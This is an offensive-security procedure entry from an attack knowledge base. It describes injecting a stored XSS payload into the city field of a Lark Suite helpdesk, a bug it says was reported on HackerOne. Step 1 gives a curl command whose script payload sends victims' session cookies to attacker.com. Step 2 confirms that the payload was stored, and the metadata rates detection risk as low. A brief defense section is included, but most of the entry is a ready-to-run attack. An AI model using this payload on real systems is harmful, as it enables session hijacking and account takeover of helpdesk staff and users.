---
tags:
  - xss
  - injection
  - web
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/submit-xss-payload]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:47:18.497Z'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: 14b3f6f2-0c1e-4a9e-b3ce-f62cdd7dbcea
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-Stored-XSS-Payload-in-City-Field

## Summary

This procedure exploits insufficient input sanitization in the Lark Suite helpdesk user's city field to inject and store a malicious JavaScript payload, enabling persistent XSS attacks on viewing users.

## Description

In the internal Lark Suite helpdesk, the user's city field accepts arbitrary input without proper escaping, allowing attackers with user access to store HTML/JavaScript. When helpdesk administrators or other users view the profile, the payload executes in their browser context, potentially stealing session cookies or performing other actions. This was reported on HackerOne in 2020 and resolved shortly after. Prerequisites include authenticated access to the helpdesk profile update feature.

## Requirements

1. Authenticated session in Lark Suite helpdesk
2. Access to user profile or form with city field
3. Basic knowledge of JavaScript payloads for XSS

## Defense

Defensive measures and detection strategies:

- Implement strict input validation and output encoding (e.g., HTML entity encoding) for all user inputs
- Use Content Security Policy (CSP) to restrict script execution
- Monitor for anomalous script tags in database fields via logging and WAF rules

## Objectives

1. Persist malicious script in the city field
2. Ensure payload survives storage and retrieval
3. Set up for execution on victim views

## Instructions

### Step 1: Craft and Submit Payload

**Context**: Prepare a simple test payload to verify injection, then escalate to a cookie-stealing one.

**Command** ([[commands/submit-xss-payload]]):
```bash
curl -X POST 'https://larksuite-helpdesk.example.com/profile/update' \
  -H 'Cookie: session=your_session' \
  -d 'city=<script>document.location="http://attacker.com/steal?cookie="+document.cookie</script>' \
  -d 'other_fields=values'
```

> This curl command simulates form submission to update the city field with an XSS payload that exfiltrates cookies to an attacker server. Replace URLs and session with actual values. Expected output: HTTP 200 or success response indicating profile update.

### Step 2: Verify Storage

**Context**: Retrieve the profile to confirm the payload is stored without alteration.

**Command** ([[commands/retrieve-profile]]):
```bash
curl -H 'Cookie: session=your_session' 'https://larksuite-helpdesk.example.com/profile/view'
```

> Fetches the profile page; inspect the HTML source for the injected script in the city field. Expected output: Raw HTML containing the unsanitized `<script>` tag.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/submit-xss-payload]]
- [[commands/retrieve-profile]]

## Tools Used


## Tags

- xss
- stored-xss
- injection
